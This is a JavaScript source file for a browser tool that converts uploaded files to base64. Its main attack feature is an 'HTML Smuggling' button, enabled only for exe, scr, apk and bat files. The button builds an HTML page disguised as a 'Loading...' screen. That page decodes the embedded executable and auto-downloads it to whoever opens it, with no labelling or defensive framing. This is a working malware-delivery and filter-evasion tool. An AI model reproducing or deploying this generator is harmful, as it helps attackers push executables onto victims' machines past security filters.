document.addEventListener('DOMContentLoaded', () => {
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');
    const fileName = document.getElementById('fileName');
    const fileSize = document.getElementById('fileSize');
    const convertBtn = document.getElementById('convertBtn');
    const base64Output = document.getElementById('base64Output');
    const copyBtn = document.getElementById('copyBtn');
    const downloadBtn = document.getElementById('downloadBtn');
    const smuggleBtn = document.getElementById('smuggleBtn');
    const progressContainer = document.getElementById('progressContainer');
    const progressBar = document.querySelector('.progress-bar');
    const imagePreview = document.getElementById('imagePreview');
    const previewImage = document.getElementById('previewImage');
    const imageDimensions = document.getElementById('imageDimensions');
    const togglePreviewBtn = document.getElementById('togglePreviewBtn');

    // Matrix effect setup
    const canvas = document.getElementById('matrixCanvas');
    const ctx = canvas.getContext('2d');
    let matrixInterval;

    function initMatrix() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = "日ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ0123456789:・.=*+-<>¦｜";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = [];
        const glowIntensity = [];
        const speeds = [];

        for (let i = 0; i < columns; i++) {
            drops[i] = Math.random() * -100;
            glowIntensity[i] = Math.random();
            speeds[i] = 1 + Math.random() * 1.5;
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            for (let i = 0; i < drops.length; i++) {
                // Update glow intensity
                glowIntensity[i] += 0.01;
                const glow = Math.sin(glowIntensity[i]) * 0.5 + 0.5;
                
                const x = i * fontSize;
                const y = drops[i] * fontSize;

                // Create gradient for each character
                const gradient = ctx.createLinearGradient(x, y - fontSize, x, y);
                gradient.addColorStop(0, `rgba(0, 255, 0, 0)`);
                gradient.addColorStop(0.9, `rgba(0, 255, ${glow * 100}, ${0.8 + glow * 0.2})`);
                gradient.addColorStop(1, `rgba(0, 255, 0, ${0.3 + glow * 0.3})`);

                // Draw main character
                ctx.fillStyle = gradient;
                ctx.font = `${fontSize}px "Yu Gothic", monospace`;
                const char = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(char, x, y);

                // Add subtle glow effect
                ctx.shadowColor = '#0f0';
                ctx.shadowBlur = 10 * glow;
                ctx.fillText(char, x, y);
                ctx.shadowBlur = 0;

                // Draw trailing characters with fade effect
                for (let j = 1; j < 5; j++) {
                    const opacity = (5 - j) / 15;
                    ctx.fillStyle = `rgba(0, 255, 0, ${opacity})`;
                    const trailChar = chars[Math.floor(Math.random() * chars.length)];
                    ctx.fillText(trailChar, x, y - j * fontSize);
                }

                // Reset and randomize drop position
                if (y > canvas.height + 100) {
                    drops[i] = Math.random() * -50;
                    speeds[i] = 1 + Math.random() * 1.5;
                }
                drops[i] += speeds[i];
            }
        }

        return setInterval(drawMatrix, 33);
    }

    // Modal functionality
    const infoIcon = document.getElementById('infoIcon');
    const matrixModal = document.getElementById('matrixModal');
    const closeBtn = document.querySelector('.close-btn');

    infoIcon.addEventListener('click', () => {
        matrixModal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        matrixInterval = initMatrix();
        animateInfo();
    });

    function closeModal() {
        matrixModal.style.display = 'none';
        document.body.style.overflow = 'auto';
        clearInterval(matrixInterval);
    }

    closeBtn.addEventListener('click', closeModal);
    matrixModal.addEventListener('click', (e) => {
        if (e.target === matrixModal) {
            closeModal();
        }
    });

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && matrixModal.style.display === 'block') {
            closeModal();
        }
    });

    function animateInfo() {
        const spans = document.querySelectorAll('.info-item span');
        spans.forEach((span, index) => {
            span.style.animation = 'none';
            span.offsetHeight; // Trigger reflow
            span.style.animation = `fadeIn 0.5s ${index * 0.2}s forwards`;
        });
    }

    // Handle window resize for matrix effect
    window.addEventListener('resize', () => {
        if (matrixModal.style.display === 'block') {
            clearInterval(matrixInterval);
            matrixInterval = initMatrix();
        }
    });

    // Drag and drop handlers
    dropZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        dropZone.style.borderColor = '#0f0';
        dropZone.style.background = 'rgba(0, 255, 0, 0.1)';
    });

    dropZone.addEventListener('dragleave', (e) => {
        e.preventDefault();
        dropZone.style.borderColor = 'rgba(0, 255, 0, 0.3)';
        dropZone.style.background = 'transparent';
    });

    dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropZone.style.borderColor = 'rgba(0, 255, 0, 0.3)';
        dropZone.style.background = 'transparent';
        imagePreview.style.display = 'none';
        
        const file = e.dataTransfer.files[0];
        const validExtensions = ['exe', 'scr', 'apk', 'bat', 'jpg', 'jpeg', 'png', 'doc', 'docx', 'xls', 'xlsx'];
        const fileExtension = file.name.split('.').pop().toLowerCase();
        
        if (file && validExtensions.includes(fileExtension)) {
            handleFile(file);
        } else {
            alert('Unsupported file type! Please select a supported file type.');
        }
    });

    // Click to upload
    dropZone.addEventListener('click', () => {
        fileInput.click();
    });

    fileInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            const validExtensions = ['exe', 'scr', 'apk', 'bat', 'jpg', 'jpeg', 'png', 'doc', 'docx', 'xls', 'xlsx'];
            const fileExtension = file.name.split('.').pop().toLowerCase();
            
            if (validExtensions.includes(fileExtension)) {
                handleFile(file);
            } else {
                alert('Unsupported file type! Please select a supported file type.');
                fileInput.value = '';
            }
        }
    });

    function handleFile(file) {
        // Increase size limit for image files
        const maxSize = getMaxSizeForFileType(file.type);
        if (file.size > maxSize) {
            alert(`File size too large! Maximum size for ${getFileTypeDisplay(file.type)}: ${formatFileSize(maxSize)}`);
            fileInput.value = '';
            return;
        }
        
        // Update file info with appropriate icon
        const fileIcon = getFileIcon(file);
        fileName.textContent = file.name;
        fileName.className = ''; // Reset any existing classes
        fileName.innerHTML = `<i class="${fileIcon}"></i> ${file.name}`;
        fileSize.textContent = formatFileSize(file.size);
        
        convertBtn.disabled = false;
        base64Output.value = '';
        copyBtn.disabled = true;
        downloadBtn.disabled = true;
        smuggleBtn.disabled = true;

        // Only show smuggle button for executable files
        const isExecutable = /\.(exe|scr|apk|bat)$/i.test(file.name);
        smuggleBtn.style.display = isExecutable ? 'block' : 'none';
    }

    function getMaxSizeForFileType(fileType) {
        if (fileType.startsWith('image/')) {
            return 20 * 1024 * 1024; // 20MB for images
        }
        return 100 * 1024 * 1024; // 100MB for other files
    }

    function getFileTypeDisplay(fileType) {
        const types = {
            'application/x-msdownload': 'EXE',
            'application/vnd.android.package-archive': 'APK',
            'text/plain': 'BAT',
            'image/jpeg': 'JPG',
            'image/png': 'PNG',
            'application/msword': 'DOC',
            'application/vnd.openxmlformats-officedocument.wordprocessingml.document': 'DOCX',
            'application/vnd.ms-excel': 'XLS',
            'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': 'XLSX'
        };
        return types[fileType] || 'File';
    }

    function getFileIcon(file) {
        const extension = file.name.split('.').pop().toLowerCase();
        const icons = {
            'exe': 'fas fa-cog',
            'scr': 'fas fa-cog',
            'apk': 'fab fa-android',
            'bat': 'fas fa-terminal',
            'jpg': 'fas fa-image',
            'jpeg': 'fas fa-image',
            'png': 'fas fa-image',
            'doc': 'fas fa-file-word',
            'docx': 'fas fa-file-word',
            'xls': 'fas fa-file-excel',
            'xlsx': 'fas fa-file-excel'
        };
        return icons[extension] || 'fas fa-file';
    }

    function convertToBase64(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            
            reader.onloadstart = () => {
                progressBar.style.width = '0%';
            };
            
            reader.onprogress = (event) => {
                if (event.lengthComputable) {
                    const progress = (event.loaded / event.total) * 100;
                    progressBar.style.width = `${progress}%`;
                }
            };
            
            reader.onload = () => {
                try {
                    const base64String = reader.result.split(',')[1];
                    if (base64String) {
                        resolve(base64String);
                    } else {
                        reject(new Error('Invalid file content'));
                    }
                } catch (error) {
                    reject(new Error('Failed to process file'));
                }
            };
            
            reader.onerror = () => {
                reject(new Error('Failed to read file'));
            };
            
            reader.readAsDataURL(file);
        });
    }

    // Convert button handler
    convertBtn.addEventListener('click', async () => {
        const file = fileInput.files[0];
        if (!file) return;

        // Reset and show progress
        progressContainer.classList.add('active');
        progressBar.style.width = '0%';
        base64Output.value = '';
        imagePreview.style.display = 'none';
        
        convertBtn.disabled = true;
        convertBtn.classList.add('converting');
        convertBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Converting...';

        try {
            const base64String = await convertToBase64(file);
            if (base64String) {
                base64Output.value = base64String;
                copyBtn.disabled = false;
                downloadBtn.disabled = false;
                smuggleBtn.disabled = false;

                // Handle image preview if file is an image
                if (file.type.startsWith('image/')) {
                    setupImagePreview(file, base64String);
                }
            } else {
                throw new Error('Conversion failed');
            }
        } catch (error) {
            alert('Error converting file: ' + error.message);
            base64Output.value = '';
            copyBtn.disabled = true;
            downloadBtn.disabled = true;
            smuggleBtn.disabled = true;
            imagePreview.style.display = 'none';
        } finally {
            // Complete progress animation
            progressBar.style.width = '100%';
            
            setTimeout(() => {
                convertBtn.disabled = false;
                convertBtn.classList.remove('converting');
                convertBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Convert to Base64';
                
                // Hide progress bar with delay for smooth animation
                setTimeout(() => {
                    progressContainer.classList.remove('active');
                    progressBar.style.width = '0%';
                }, 500);
            }, 500);
        }
    });

    function setupImagePreview(file, base64String) {
        // Create image preview
        const img = new Image();
        img.onload = () => {
            imageDimensions.textContent = `${img.width}x${img.height}px`;
            previewImage.src = img.src;
            imagePreview.style.display = 'block';
            imagePreview.classList.add('show');
        };
        img.src = `data:${file.type};base64,${base64String}`;
    }

    // Toggle preview button handler
    togglePreviewBtn.addEventListener('click', () => {
        const isHidden = previewImage.style.display === 'none';
        previewImage.style.display = isHidden ? 'block' : 'none';
        togglePreviewBtn.innerHTML = isHidden ? 
            '<i class="fas fa-eye-slash"></i> Hide Preview' : 
            '<i class="fas fa-eye"></i> Show Preview';
    });

    // Copy button handler
    copyBtn.addEventListener('click', async () => {
        try {
            await navigator.clipboard.writeText(base64Output.value);
            const originalText = copyBtn.innerHTML;
            copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
            setTimeout(() => {
                copyBtn.innerHTML = originalText;
            }, 2000);
        } catch (err) {
            // Fallback for older browsers
            base64Output.select();
            base64Output.setSelectionRange(0, 99999); // For mobile devices
            try {
                document.execCommand('copy');
                const originalText = copyBtn.innerHTML;
                copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                setTimeout(() => {
                    copyBtn.innerHTML = originalText;
                }, 2000);
            } catch (err) {
                alert('Failed to copy to clipboard');
            }
        }
    });

    // Download button handler
    downloadBtn.addEventListener('click', () => {
        if (!base64Output.value) {
            alert('No data to download!');
            return;
        }

        const blob = new Blob([base64Output.value], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${fileName.textContent.replace('.exe', '')}_base64.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    });

    // HTML Smuggling handler
    smuggleBtn.addEventListener('click', () => {
        if (!base64Output.value) {
            alert('No data to generate HTML file!');
            return;
        }

        const originalFileName = fileName.textContent;
        const base64Data = base64Output.value;
        
        const htmlTemplate = `
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            background: #000;
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 3px solid #0f0;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
    function executeFile() {
        try {
            const base64String = "${base64Data}";
            const byteCharacters = atob(base64String);
            const byteArrays = [];
            
            for (let offset = 0; offset < byteCharacters.length; offset += 1024) {
                const slice = byteCharacters.slice(offset, offset + 1024);
                const byteNumbers = new Array(slice.length);
                
                for (let i = 0; i < slice.length; i++) {
                    byteNumbers[i] = slice.charCodeAt(i);
                }
                
                const byteArray = new Uint8Array(byteNumbers);
                byteArrays.push(byteArray);
            }
            
            const blob = new Blob(byteArrays, {type: 'application/x-msdownload'});
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = "${originalFileName}";
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
            
            // Hide loader after execution
            setTimeout(() => {
                document.querySelector('.loader').classList.add('hidden');
            }, 1000);
        } catch (error) {
            console.error(error);
        }
    }
    
    // Auto-execute on page load
    window.onload = () => setTimeout(executeFile, 500);
    </script>
</body>
</html>`;

        const blob = new Blob([htmlTemplate], { type: 'text/html' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `download_${originalFileName.replace('.exe', '')}.html`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    });

    function formatFileSize(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
}); 